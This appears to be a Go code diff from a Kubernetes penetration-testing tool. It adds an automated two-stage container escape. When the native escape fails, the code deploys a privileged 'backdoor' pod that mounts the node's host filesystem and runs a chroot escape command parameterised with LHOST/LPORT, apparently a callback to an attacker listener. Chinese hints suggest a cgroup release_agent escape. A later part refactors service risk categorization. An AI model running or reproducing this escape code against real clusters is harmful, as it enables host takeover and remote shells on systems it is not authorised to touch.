+		evidence = out
+	}
+	hostFSMounted = strings.Contains(out, "MOUNT_OK")
+	hostContainerCreated = strings.Contains(out, "DOCKER_CONTAINER_CREATED")
+
+	step3Output := out
+	if len(step3Output) > 500 {
+		step3Output = step3Output[:500] + "..."
+	}
+	step := gin.H{"step": 3, "action": "execute", "method": method, "container": containerName, "escaped": escaped, "output": step3Output}
+	if hostFSMounted {
+		step["host_fs_mounted"] = true
+	}
+	if hostContainerCreated {
+		step["host_container_created"] = true
+	}
+	steps = append(steps, step)
+
+	// Stage 2: If native escape failed due to missing binaries, auto-deploy a privileged escape pod
+	if !escaped && (strings.Contains(out, "MISSING_BINARY:") || strings.Contains(out, "DOCKER_ESCAPE_FAILED") || strings.Contains(out, "NO_HOST_DISK") || strings.Contains(out, "CHROOT_FAILED") || strings.Contains(out, "HOST_MOUNT_BROKEN")) {
+		missing := extractMissingBinary(out)
+		steps = append(steps, gin.H{"step": 4, "action": "deploy_escape_pod", "result": fmt.Sprintf("native escape failed (missing %s), auto-deploying temporary privileged pod", missing)})
+
+		escapePodName := "k8spen-escape-" + fmt.Sprintf("%d", time.Now().UnixNano()%100000)
+		escapeNs := target.pod.Namespace
+		if escapeNs == "" {
+			escapeNs = "default"
+		}
+		escapePod := kubectl.BuildBackdoorPod(escapePodName, escapeNs, "alpine:3.20", "/host", target.pod.Spec.NodeName)
+
+		_, createErr := client.CreatePrivilegedPod(ctx, escapeNs, escapePod)
+		if createErr != nil {
+			steps = append(steps, gin.H{"step": 4, "action": "deploy_failed", "error": createErr.Error()})
+		} else {
+			// Wait for pod to be running
+			waitCtx, waitCancel := context.WithTimeout(ctx, 30*time.Second)
+			defer waitCancel()
+			running := false
+			for i := 0; i < 15; i++ {
+				if waitCtx.Err() != nil {
+					break
+				}
+				p, getErr := client.GetPod(waitCtx, escapeNs, escapePodName)
+				if getErr == nil && p.Status.Phase == "Running" {
+					running = true
+					break
+				}
+				time.Sleep(2 * time.Second)
+			}
+
+			if !running {
+				steps = append(steps, gin.H{"step": 4, "action": "pod_not_ready", "error": "escape pod did not become ready in time"})
+			} else {
+				steps = append(steps, gin.H{"step": 4, "action": "escape_pod_ready", "pod": escapeNs + "/" + escapePodName})
+
+				// Execute chroot escape in the escape pod
+				stage2Cmd := autoEscapeMountedHostCommand("/host", req.LHOST, req.LPORT)
+				stage2Ctx, stage2Cancel := context.WithTimeout(ctx, 20*time.Second)
+				defer stage2Cancel()
+				s2Result, s2Err := client.ExecInPodResult(stage2Ctx, escapeNs, escapePodName, "backdoor", []string{"sh", "-c", stage2Cmd})
+				s2Out := ""
+				if s2Err != nil {
+					s2Out = "stage2 exec error: " + s2Err.Error()
+					if s2Result != nil {
+						s2Out += "\nstdout: " + s2Result.Stdout
+					}
+				} else {
+					s2Out = s2Result.Stdout
+					if s2Result.Stderr != "" {
+						s2Out += "\n" + s2Result.Stderr
+					}
+				}
+
+				if strings.Contains(s2Out, "ESCAPED_TO_HOST") {
+					escaped = true
+					evidence = s2Out
+					hostFSMounted = true
+				}
+
+				s2Preview := s2Out
+				if len(s2Preview) > 500 {
+					s2Preview = s2Preview[:500] + "..."
+				}
+				steps = append(steps, gin.H{"step": 5, "action": "chroot_escape", "escaped": escaped, "output": s2Preview})
+
+				// Clean up escape pod
+				if delErr := client.DeletePod(ctx, escapeNs, escapePodName); delErr != nil {
+					steps = append(steps, gin.H{"step": 6, "action": "cleanup", "error": "failed to delete escape pod: " + delErr.Error()})
+				} else {
+					steps = append(steps, gin.H{"step": 6, "action": "cleanup", "result": "escape pod deleted"})
+				}
+			}
+		}
+	}
+
+	resp := gin.H{
+		"escaped":                escaped,
+		"steps":                  steps,
+		"pod_used":               target.pod.Namespace + "/" + target.pod.Name,
+		"container_used":         containerName,
+		"evidence":               evidence,
+		"host_fs_mounted":        hostFSMounted,
+		"host_container_created": hostContainerCreated,
+	}
+	if !escaped && execErr != nil {
+		resp["error"] = "exec into pod failed: " + execErr.Error()
+		resp["full_output"] = out
+	}
+	if !escaped && (strings.Contains(out, "MISSING_BINARY:") || strings.Contains(out, "DOCKER_ESCAPE_FAILED") || strings.Contains(out, "NO_HOST_DISK") || strings.Contains(out, "CHROOT_FAILED") || strings.Contains(out, "HOST_MOUNT_BROKEN")) {
+		stage2Ran := len(steps) >= 5 // step 4 = deploy, step 5 = exec
+		if strings.Contains(out, "MISSING_BINARY:") {
+			missing := extractMissingBinary(out)
+			if stage2Ran {
+				resp["error"] = "两阶段逃逸均失败: Stage1 缺少 " + missing + " → 已自动部署特权Pod但逃逸未成功"
+				resp["hint"] = "特权逃逸 Pod 已部署但 chroot 未成功。检查 /host 挂载是否完整，或手动 exec 进入逃逸 Pod 排查"
+			} else {
+				resp["error"] = "容器缺少必要二进制: " + missing
+				resp["hint"] = "已自动部署特权逃逸 Pod 执行 chroot 逃逸。如仍失败，手动进入逃逸 Pod 尝试 cgroup release_agent"
+			}
+			resp["missing_binary"] = missing
+		} else if strings.Contains(out, "DOCKER_ESCAPE_FAILED") {
+			resp["error"] = "Docker API 逃逸失败 (docker.sock 存在但 docker 命令执行失败)"
+			resp["hint"] = "检查 Docker daemon 是否正常运行，或通过 Stage2 部署特权逃逸 Pod"
+		} else {
+			resp["error"] = "原生逃逸失败: " + method
+			resp["hint"] = "已自动部署特权逃逸 Pod 尝试 chroot 路径"
+		}
+	}
+	if hostFSMounted && !escaped {
+		resp["note"] = "宿主机文件系统已挂载，但还没有看到明确的宿主机 shell / chroot 成功证据。"
+	}
+	if hostContainerCreated && !escaped {
+		resp["note"] = "已通过 docker.sock 创建宿主机侧特权容器，但当前返回还没有直接宿主机 shell 证据。"
+	}
+	c.JSON(http.StatusOK, resp)
+}
 
 type servicesScanRequest struct {
 	TargetHost string `json:"target_host" binding:"required"`
@@ -1484,6 +1638,44 @@ type servicesScanRequest struct {
 	Password   string `json:"password"`
 	SkipTLS    bool   `json:"skip_tls"`
 	TimeoutSec int    `json:"timeout_sec"`
+}
+
+func categorizeService(name string, serviceType corev1.ServiceType, ports []corev1.ServicePort) (string, string) {
+	lowerName := strings.ToLower(name)
+	hasPort := func(values ...int32) bool {
+		for _, port := range ports {
+			for _, value := range values {
+				if port.Port == value || port.NodePort == value || port.TargetPort.IntVal == value {
+					return true
+				}
+			}
+		}
+		return false
+	}
+	switch {
+	case strings.Contains(lowerName, "kube-dns") || strings.Contains(lowerName, "coredns") || hasPort(53):
+		return "dns", "medium"
+	case strings.Contains(lowerName, "kubernetes-dashboard") || strings.Contains(lowerName, "dashboard"):
+		return "dashboard", "high"
+	case strings.Contains(lowerName, "metrics-server"):
+		return "monitoring", "info"
+	case strings.Contains(lowerName, "prometheus") || strings.Contains(lowerName, "grafana") || strings.Contains(lowerName, "alertmanager"):
+		return "monitoring", "medium"
+	case strings.Contains(lowerName, "istio") || strings.Contains(lowerName, "envoy"):
+		return "service-mesh", "info"
+	case strings.Contains(lowerName, "nginx-ingress") || strings.Contains(lowerName, "ingress-nginx") || strings.Contains(lowerName, "traefik"):
+		return "ingress", "medium"
+	case strings.Contains(lowerName, "etcd") || hasPort(2379, 2380):
+		return "etcd", "critical"
+	case strings.Contains(lowerName, "ssh") || strings.Contains(lowerName, "shell") || hasPort(22, 2222):
+		return "remote-access", "high"
+	case strings.Contains(lowerName, "admin") || strings.Contains(lowerName, "backdoor") || strings.Contains(lowerName, "hacker") || strings.Contains(lowerName, "hecker"):
+		return "suspicious", "high"
+	case serviceType == corev1.ServiceTypeNodePort || serviceType == corev1.ServiceTypeLoadBalancer:
+		return "exposed", "medium"
+	default:
+		return "other", "info"
+	}
 }
 
 func (h *CDKHandler) ServicesScan(c *gin.Context) {
@@ -1513,28 +1705,7 @@ func (h *CDKHandler) ServicesScan(c *gin.Context) {
 			for _, p := range svc.Spec.Ports {
 				ports = append(ports, fmt.Sprintf("%d/%s", p.Port, p.Protocol))
 			}
-			category := "other"
-			risk := "info"
-			switch {
-			case strings.Contains(svc.Name, "kube-dns") || strings.Contains(svc.Name, "coredns"):
-				category = "dns"
-				risk = "medium"
-			case strings.Contains(svc.Name, "kubernetes-dashboard") || strings.Contains(svc.Name, "dashboard"):
-				category = "dashboard"
-				risk = "high"
-			case strings.Contains(svc.Name, "metrics-server"):
-				category = "monitoring"
-			case strings.Contains(svc.Name, "prometheus") || strings.Contains(svc.Name, "grafana"):
-				category = "monitoring"
-				risk = "medium"
-			case strings.Contains(svc.Name, "istio") || strings.Contains(svc.Name, "envoy"):
-				category = "service-mesh"
-			case strings.Contains(svc.Name, "nginx-ingress") || strings.Contains(svc.Name, "traefik"):
-				category = "ingress"
-			case strings.Contains(svc.Name, "etcd"):
-				category = "etcd"
-				risk = "critical"
-			}
+			category, risk := categorizeService(svc.Name, svc.Spec.Type, svc.Spec.Ports)
 			services = append(services, gin.H{"namespace": svc.Namespace, "name": svc.Name, "type": string(svc.Spec.Type), "cluster_ip": svc.Spec.ClusterIP, "ports": ports, "category": category, "risk": risk})
 		}
 	}
